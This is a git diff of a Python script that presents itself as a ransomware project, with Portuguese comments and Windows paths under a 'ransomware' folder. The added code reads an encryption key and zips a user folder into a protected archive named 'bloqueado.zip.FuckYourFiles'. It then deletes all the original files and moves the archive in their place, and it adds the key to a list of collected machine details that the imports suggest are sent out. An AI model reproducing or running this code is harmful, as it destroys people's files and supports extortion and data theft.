@@ -1,8 +1,10 @@
 import os
+import shutil
 import smtplib
 import socket
 import sys
 from pathlib import Path
+from time import sleep
 
 import psutil
 import pyzipper
@@ -11,9 +13,13 @@ from requests import get
 
 key = ''.encode()
 while True:
-    with open('config/wasEncripted.txt', 'rb') as wasEncripted:
-        encriptado = wasEncripted.read()
-        if 'sim'.encode() in encriptado:
+    with open('config/wasEncripted.txt', 'r') as wasEncripted:
+        valida = wasEncripted.read()
+
+        if 'sim' in valida:
+            with open('config/filekey.key', 'r') as fileKey:
+                key = fileKey.read()
+                print(key)
             break
         else:
 
@@ -28,7 +34,6 @@ while True:
             status = 'sim'.encode()
             with open('config/wasEncripted.txt', 'wb') as wasEncripted:
                 wasEncripted.write(status)
-            print(encriptado)
 
     def zip_folderPyzipper(folder_path, output_path):
         """Zip the contents of an entire folder (with that folder included
@@ -71,11 +76,23 @@ while True:
     zip_folderPyzipper('C:/Users\jeffe\python/ransomware/usuario',
                        'C:/Users\jeffe\python\ransomware')
 
+    for filename in os.listdir('C:/Users\jeffe\python/ransomware/usuario'):
+        filepath = os.path.join(
+            'C:/Users\jeffe\python/ransomware/usuario', filename)
+        try:
+            shutil.rmtree(filepath)
+        except OSError:
+            os.remove(filepath)
+    shutil.move('bloqueado.zip.FuckYourFiles', 'usuario')
+
 print('parece que os arquivos já foram encriptados')
 
 
 def obtemInformacao():
     dados = []
+    dados.append('CHAVE --->\n')
+    dados.append(key)
+    dados.append('\n\n')
 
     machineName = '\nnome da maquina:', os.getenv('COMPUTERNAME')
     dados.append(machineName)
